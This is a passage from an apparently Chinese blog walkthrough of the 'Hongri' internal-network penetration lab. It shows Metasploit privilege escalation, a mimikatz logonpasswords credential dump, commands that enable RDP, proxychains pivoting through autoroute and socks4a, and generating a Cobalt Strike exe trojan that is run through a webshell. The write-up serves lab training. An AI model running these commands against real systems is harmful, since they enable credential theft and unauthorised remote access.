+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652347.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652347.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652347.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652347.png"
+        title="image-20221019165205990" /></p>
+<p>成功上线msf</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652829.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652829.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652829.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652829.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191652829.png"
+        title="image-20221019165221803" /></p>
+<h3 id="msf提权">msf提权</h3>
+<pre tabindex="0"><code>getuid查看服务器权限
+getsystem 提权
+getuid 查看是否提权成功
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191702079.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191702079.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191702079.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191702079.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191702079.png"
+        title="image-20221019170211058" /></p>
+<h3 id="msf查看明文密码">msf查看明文密码</h3>
+<p>猕猴桃我滴神</p>
+<pre tabindex="0"><code>meterpreter &gt; upload /mimikatz.exe
+meterpreter &gt; execute -i -f mimikatz.exe
+sekurlsa::logonpasswords           
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191746423.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191746423.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191746423.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191746423.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210191746423.png"
+        title="image-20221019174604371" /></p>
+<h3 id="3389远程桌面连接">3389远程桌面连接</h3>
+<p><strong>使用meterpreter命令</strong> run getgui -e 开放目标机3389远程桌面端口</p>
+<pre tabindex="0"><code>开放3389:    meterpreter &gt; run getgui -e
+开启远程桌面：meterpreter &gt; run post/windows/manage/enable_rdp
+</code></pre><p><strong>windows打开3389</strong>远程连接的命令有两种办法，任选其一：</p>
+<pre tabindex="0"><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre><p><strong>xfreerdp工具</strong></p>
+<p>命令格式如下：
+很容易理解，/u就是用户名，/p是密码，/v是靶机（目标）的地址 /size就是图形化界面的大小而已</p>
+<pre tabindex="0"><code>proxychains xfreerdp /u:Administrator /p:123 /v:192.168.33.33 /size:80%
+</code></pre><p><strong>rdesktop</strong></p>
+<p>命令格式很简单：</p>
+<pre tabindex="0"><code class="language-markup" data-lang="markup">proxychains rdesktop 192.168.33.33
+</code></pre><h2 id="msf隧道搭建-横向移动">msf隧道搭建 横向移动</h2>
+<p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机。</p>
+<p>msf+proxychains</p>
+<p>可用msf直接搭建sock隧道：
+进入session，自动创建路由：</p>
+<pre tabindex="0"><code>run post/multi/manage/autoroute
+</code></pre><p>查看路由：</p>
+<pre tabindex="0"><code>run autoroute -p
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200002685.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200002685.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200002685.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200002685.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200002685.png"
+        title="image-20221020000229648" /></p>
+<pre tabindex="0"><code>arp -a 
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200004690.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200004690.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200004690.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200004690.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210200004690.png"
+        title="image-20221020000419664" /></p>
+<p>退到上层，使用socks4a进行代理，端口与proxychains里设置一致即可：</p>
+<pre tabindex="0"><code>background
+use auxiliary/server/socks4a
+run
+</code></pre><h2 id="cs上线">CS上线</h2>
+<p>首先在kali启动端：kali的IP＋密码123456</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192303280.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192303280.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192303280.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192303280.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192303280.png"
+        title="image-20221019230313254" /></p>
+<p>新建监听</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244519.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244519.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244519.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244519.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244519.png"
+        title="image-20221019224408344" /></p>
+<p>生成exe木马</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244559.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244559.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244559.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244559.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192244559.png"
+        title="image-20221019224436526" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192248154.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192248154.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192248154.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192248154.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192248154.png"
+        title="image-20221019224808121" /></p>
+<p>传入蚁剑，然后执行，成功上线</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192255708.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192255708.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192255708.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192255708.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192255708.png"
+        title="image-20221019225550676" /></p>
+<p>开启命令界面，并sleep 1设置交互时间</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192258279.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192258279.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192258279.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192258279.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192258279.png"
+        title="image-20221019225812252" /></p>
+<p>查看域信息：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192330551.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192330551.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192330551.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192330551.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192330551.png"
+        title="image-20221019233044515" /></p>
+<p>CS的mimikatz功能抓取目标机用户密码：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192302534.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192302534.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192302534.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192302534.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192302534.png"
+        title="image-20221019230219496" /></p>
+<p>通过CS的elevate进行账户提权：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310785.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310785.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310785.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310785.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310785.png"
+        title="image-20221019231004751" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310720.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310720.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310720.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310720.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210192310720.png"
+        title="image-20221019231018693" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" data-title="红日靶场 1" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" data-title="红日靶场 1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" data-title="红日靶场 1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" data-title="红日靶场 1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/" class="prev" rel="prev" title="红日靶场2"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>红日靶场2</a>
+            <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" class="next" rel="next" title="三层靶机frp">三层靶机frp<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
